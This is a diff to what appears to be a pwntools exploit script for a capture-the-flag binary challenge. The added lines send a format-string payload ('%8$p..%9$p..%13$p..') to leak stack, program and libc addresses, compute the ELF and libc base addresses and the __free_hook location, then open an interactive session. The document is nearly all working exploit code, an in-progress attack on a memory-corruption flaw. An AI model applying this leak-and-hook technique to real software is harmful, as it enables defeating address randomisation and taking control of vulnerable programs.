@@ -38,11 +38,26 @@ def Play(length, name):
     io.sendlineafter(":\n", str(length))
     io.sendafter(":\n", name)
 
+def Show():
+    io.sendlineafter("xit\n", "S")
+
 if __name__ == "__main__":
     dll = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
     dll.srand(1)
 
-    Play()
+    Play(20, "%8$p..%9$p..%13$p..")
+    DEBUG()
+    Show()
+    io.recvuntil("0x")
+    showRbp = int(io.recvuntil("..", drop = True), 16)
+    success("showRbp -> {:#x}".format(showRbp))
+    elfBase = int(io.recvuntil("..", drop = True), 16) - 0x18d5
+    success("elfBase -> {:#x}".format(elfBase))
+    libcBase = int(io.recvuntil("..", drop = True), 16) - libc.sym['__libc_start_main'] - 241
+    success("libcBase -> {:#x}".format(libcBase))
+    pause()
+    freeHook = libcBase + libc.sym[u'__free_hook']
+
 
     
     io.interactive()
